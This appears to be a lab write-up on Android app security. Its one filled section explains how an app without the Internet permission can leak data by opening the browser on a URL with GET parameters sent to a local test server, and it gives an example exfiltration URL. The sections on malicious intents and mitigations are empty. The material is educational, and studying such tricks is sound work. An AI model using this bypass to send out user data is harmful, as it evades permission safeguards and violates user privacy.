# 1 - No-permission apps

In this part, we will exfiltrate some data to a server, without using
the `Internet` permission.

First, we need to setup a web server. Here, it is a localhost server
running on port 3001, so its address is `10.0.2.2:3001` on the emulated
device.

Then, we populate the database on the app:

![Database content](./assets/database_content_p1.png)

When we want to exfiltrate the data, we just have to create an intent to
open our server webpage with GET parameters, like
`http://10.0.2.2:3001/?secret1=abc&secret2=def`.

In our example, the server received this:

![Server request](./assets/server_request_p1.png)

On android and iOS, apps are sandboxed and heavily restricted, as
opposed to desktop apps. If an app wants to access a private resource
(camera, location, etc), it needs to be explicitely allowed to do so by
the OS and the user. The goal is to make these apps as secure and as
privacy-aware as possible. While on desktop a simple Tetris has read and
write access to all user files, on android even a vulnerable app is
limited in its action. it also hints on illegitimate apps; for examle,
the flashlight app shouldn't require microphone access.

However, here our application uses a simple trick to bypass this
permission system. It will open the web browser on a specific page, and
while it usually is quite innocent since the webpage cannot talk back to
the app, it is enough to leak informations using GET parameters. It
should be noted however that, first, the data accessible is only our own
data, which limits the damages possible, and that this method isn't very
discreet, as the user clearly sees its browser opening.

# 2 - Malicious intents



# 3 - Protections and mitigations
